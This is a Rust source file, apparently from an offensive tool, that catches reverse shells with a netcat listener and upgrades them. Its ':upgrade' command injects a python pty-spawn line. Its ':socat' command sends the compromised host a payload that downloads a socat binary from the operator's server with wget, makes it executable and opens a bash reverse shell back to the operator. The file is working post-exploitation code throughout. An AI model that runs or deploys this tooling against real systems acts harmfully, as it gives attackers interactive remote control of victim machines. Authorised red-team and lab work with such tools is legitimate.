use crate::serve;
use nix::libc;
use std::ffi::CStr;
use std::io::{self, BufRead, Read, Write};
use std::mem::zeroed;
use std::os::unix::io::AsRawFd;
use std::process::{ChildStdin, Command, Stdio};
use std::thread;
use std::time::Duration;
use termios::{ECHO, ICANON, TCSANOW, Termios, tcgetattr, tcsetattr};

pub struct Socat {
    pub port: u16,
}

pub struct Netcat {
    pub port: u16,
    pub ip: String,
    pub config: json::JsonValue,
}

impl Netcat {
    pub fn new(port: u16, config: json::JsonValue, ip: &str) -> Self {
        Netcat {
            port,
            config,
            ip: ip.to_string(),
        }
    }

    pub fn run(&self) -> io::Result<()> {
        let mut child = Command::new("nc")
            .arg("-lnvp")
            .arg(self.port.to_string())
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::inherit())
            .spawn()?;

        let mut nc_stdin = child.stdin.take().expect("nc stdin");
        let mut nc_stdout = child.stdout.take().expect("nc stdout");

        // stdout reader thread for nc
        let _nc_read = thread::spawn(move || {
            let mut out = io::stdout();
            let mut buf = [0u8; 4096];
            loop {
                match nc_stdout.read(&mut buf) {
                    Ok(0) | Err(_) => break,
                    Ok(n) => {
                        let _ = out.write_all(&buf[..n]);
                        let _ = out.flush();
                    }
                }
            }
        });

        let stdin = io::stdin();
        let mut stdin_lock = stdin.lock();
        let mut line = String::new();

        loop {
            line.clear();
            if stdin_lock.read_line(&mut line)? == 0 {
                break;
            }
            let trimmed = line.trim_end_matches('\n');

            if trimmed.starts_with(':') {
                match trimmed {
                    ":upgrade" => {
                        println!("ℹ️  Ctrl+C will still kill this shell. Upgrade to socat with :socat");
                        nc_stdin.write_all(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")?;
                        let saved = set_raw_mode()?;
                        raw_forward(&mut nc_stdin)?;
                        restore_mode(&saved)?;
                        break;
                    }
                    ":socat" => {
                        // serve socat binary
                        let serve_files = ["socat".to_string()];
                        let http_port = self.config["shelly"]["default_http_svr"]
                            .as_u16()
                            .unwrap();
                        serve::build_from_config(&serve_files, &self.config, http_port);

                        let socat_port = self.port + 1;
                        let tty = get_tty_path()?;
                        let file_arg = format!("file:{},raw,echo=0", tty);

                        let mut socat_child = Command::new("socat")
                            .arg(file_arg)
                            .arg(format!("tcp-listen:{},reuseaddr,fork", socat_port))
                            .stdin(Stdio::piped())
                            .stdout(Stdio::piped())
                            .stderr(Stdio::inherit())
                            .spawn()
                            .map_err(|e| {
                                eprintln!("failed to start local socat: {}", e);
                                e
                            })?;

                        let payload = format!(
                            "wget -q http://{ip}:{http_port}/socatx64.bin -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}\n",
                            ip = self.ip,
                            http_port = http_port,
                            port = socat_port
                        );
                        nc_stdin.write_all(payload.as_bytes())?;
                        nc_stdin.flush()?;
                        drop(nc_stdin);

                        // wait briefly for remote to connect back
                        thread::sleep(Duration::from_millis(200));

                        let mut socat_stdin = socat_child.stdin.take().expect("socat stdin");
                        let mut socat_stdout = socat_child.stdout.take().expect("socat stdout");

                        let saved = set_raw_mode()?;

                        // thread to read socat stdout -> local stdout
                        let reader = thread::spawn(move || {
                            let mut out = io::stdout();
                            let mut buf = [0u8; 4096];
                            loop {
                                match socat_stdout.read(&mut buf) {
                                    Ok(0) | Err(_) => break,
                                    Ok(n) => {
                                        let _ = out.write_all(&buf[..n]);
                                        let _ = out.flush();
                                    }
                                }
                            }
                        });

                        // main thread: stdin -> socat_stdin, forward Ctrl-C as byte 0x03
                        {
                            let stdin = io::stdin();
                            let mut handle = stdin.lock();
                            let mut buf = [0u8; 4096];
                            loop {
                                let n = handle.read(&mut buf)?;
                                if n == 0 {
                                    break;
                                }
                                for &b in &buf[..n] {
                                    let to_write = [b];
                                    if let Err(_) = socat_stdin.write_all(&to_write) {
                                        break;
                                    }
                                }
                                socat_stdin.flush()?;
                            }
                        }

                        restore_mode(&saved)?;
                        let _ = reader.join();
                        let _ = socat_child.wait();
                        break;
                    }
                    ":quit" => {
                        drop(nc_stdin);
                        break;
                    }
                    _ => eprintln!("unknown command: {}", trimmed),
                }
            } else {
                nc_stdin.write_all(trimmed.as_bytes())?;
                nc_stdin.write_all(b"\n")?;
            }
        }

        child.wait()?;
        Ok(())
    }
}

impl Socat {
    pub fn new(port: u16) -> Self {
        Socat { port }
    }

    pub fn run(&self) -> io::Result<()> {
        let tty = get_tty_path()?;
        let file_arg = format!("file:{},raw,echo=0", tty);

        let mut child = Command::new("socat")
            .arg(file_arg)
            .arg(format!("tcp-listen:{},reuseaddr,fork", self.port))
            .stdin(Stdio::inherit())
            .stdout(Stdio::inherit())
            .stderr(Stdio::inherit())
            .spawn()?;

        let status = child.wait()?;
        if status.success() {
            Ok(())
        } else {
            Err(io::Error::new(
                io::ErrorKind::Other,
                format!("socat exited: {}", status),
            ))
        }
    }
}

/// Helper: read tty path (shared by Netcat and Socat)
fn get_tty_path() -> io::Result<String> {
    unsafe {
        let path_ptr = libc::ttyname(libc::STDIN_FILENO);
        if !path_ptr.is_null() {
            let cstr = CStr::from_ptr(path_ptr);
            if let Ok(s) = cstr.to_str() {
                if !s.is_empty() {
                    return Ok(s.to_string());
                }
            }
        }
    }

    let output = Command::new("tty").output()?;
    if output.status.success() {
        let s = String::from_utf8_lossy(&output.stdout).trim().to_string();
        if s != "not a tty" && !s.is_empty() {
            return Ok(s);
        }
    }

    Err(io::Error::new(io::ErrorKind::Other, "no controlling tty found"))
}

/// Put stdin into raw mode. Returns original Termios for restoration.
fn set_raw_mode() -> io::Result<Termios> {
    let fd = io::stdin().as_raw_fd();
    let mut orig: Termios = unsafe { zeroed() };
    tcgetattr(fd, &mut orig)?;
    let mut raw = orig.clone();
    raw.c_lflag &= !(ICANON | ECHO);
    tcsetattr(fd, TCSANOW, &raw)?;
    Ok(orig)
}

/// Restore original terminal mode.
fn restore_mode(orig: &Termios) -> io::Result<()> {
    let fd = io::stdin().as_raw_fd();
    tcsetattr(fd, TCSANOW, orig)?;
    Ok(())
}

/// Forward stdin bytes to provided ChildStdin (used after upgrade).
/// Ctrl-C (0x03) is forwarded as a literal byte.
fn raw_forward(nc_stdin: &mut ChildStdin) -> io::Result<()> {
    let stdin = io::stdin();
    let mut handle = stdin.lock();
    let mut buf = [0u8; 4096];
    loop {
        let n = handle.read(&mut buf)?;
        if n == 0 {
            break;
        }
        for &b in &buf[..n] {
            nc_stdin.write_all(&[b])?;
        }
    }
    Ok(())
}
